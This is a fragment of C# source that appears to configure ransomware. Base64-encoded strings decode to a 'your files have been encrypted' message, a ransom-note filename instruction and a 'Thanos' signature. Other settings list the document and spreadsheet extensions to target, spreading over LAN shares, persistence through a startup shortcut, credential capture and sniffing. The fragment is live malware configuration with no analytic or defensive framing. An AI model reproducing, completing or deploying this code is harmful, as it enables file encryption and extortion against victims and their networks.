		PartialSize = "10";
		StaticLooks = "YES";
		SystemFiles = "NO";
		RIPmeBiot = "YES";
		ADMINISTRATOR = "YES";
		FAC = "YES";
		Styler = "NO";
		extstyl = new List<string> { "docx", "pdf", "xlsx", "csv", "xll", "txt", "one" };
		LimitMe = "NO";
		MaxSize = "1";
		TransparentMan = "YES";
		AlternateAlgo = "NO";
		Jerry = "NO";
		toolLocation = string.Empty;
		Drag_Drop = "NO";
		NotifyMe = "YES";
		NotifyCustom = "YES";
		LegalTitle = "WU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEICEh";
		LegalText = "UkVBRCBUSEUgRklMRSAnUkVBRF9NRV9UT19SRVNUT1JFX1lPVVJfRklMRVMudHh0JyBUTyBSRVNUT1JFIFRIRU0gIQ==";
		Upper = "NO";
		LANShares = "YES";
		ProcessAll = "NO";
		ReleaseAllFiles = "NO";
		FixMBR = "NO";
		LogonPass = "LOGONISOFF";
		VeryBasicMode = "NO";
		HorseMount = "YES";
		MyStartName = "mystartup.lnk";
		SkipC = "NO";
		CatchDrv = "NO";
		RichText = "NO";
		CredActivate = "YES";
		MySign = "VGhhbm9z";
		Sniffing = "YES";
		Blocks = "YES";
	}
}
